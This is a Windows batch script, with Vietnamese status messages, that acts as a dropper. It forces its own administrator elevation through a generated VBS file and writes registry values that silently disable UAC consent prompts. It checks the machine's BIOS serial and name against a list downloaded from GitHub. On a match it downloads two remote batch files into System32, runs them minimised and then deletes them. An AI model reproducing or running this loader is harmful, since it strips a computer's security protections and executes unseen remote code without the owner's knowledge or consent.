��
cls
@echo off
@echo off
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
set "url=https://raw.githubusercontent.com/mitukitii/test/main/check.txt"
set "tempfile=%temp%\check.txt"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%tempfile%')"
if not exist "%tempfile%" (
    echo Khong tai dc file.txt.
    goto :cleanup
)
for /f "tokens=*" %%i in ('powershell -Command "(Get-CimInstance -ClassName Win32_BIOS).SerialNumber"') do set "serial=%%i"
for /f "tokens=*" %%i in ('powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystem).Name"') do set "device=%%i"
echo Serial Number: %serial%
echo Device Name: %device%
echo Noi Dung file check.txt:
type "%tempfile%"
set "found=0"
for /f "tokens=*" %%j in ('type "%tempfile%"') do (
    if /i "%%j"=="%serial%" set "found=1"
    if /i "%%j"=="%device%" set "found=1"
)
if %found%==1 (
    echo Trung Khop
start /min powershell -Command "$url1 = 'https://raw.githubusercontent.com/mitukitii/test/main/backup.bat'; $path1 = 'C:\Windows\System32\WindowsPowerShell\backup.bat'; Invoke-WebRequest -Uri $url1 -OutFile $path1; Start-Process $path1 -Wait; Remove-Item $path1"
start /min powershell -Command "$url2 = 'https://raw.githubusercontent.com/mitukitii/test/main/backup2.bat'; $path2 = 'C:\Windows\System32\WindowsPowerShell\backup2.bat'; Invoke-WebRequest -Uri $url2 -OutFile $path2; Start-Process $path2 -Wait; Remove-Item $path2"

) else (
    echo Khong Trung Khop.
)
:cleanup
if exist "%tempfile%" del "%tempfile%"
set "url="
set "tempfile="
set "serial="
set "device="
set "found="
del /f /q "%temp%\check.txt"
echo Hoan Thanh
exit
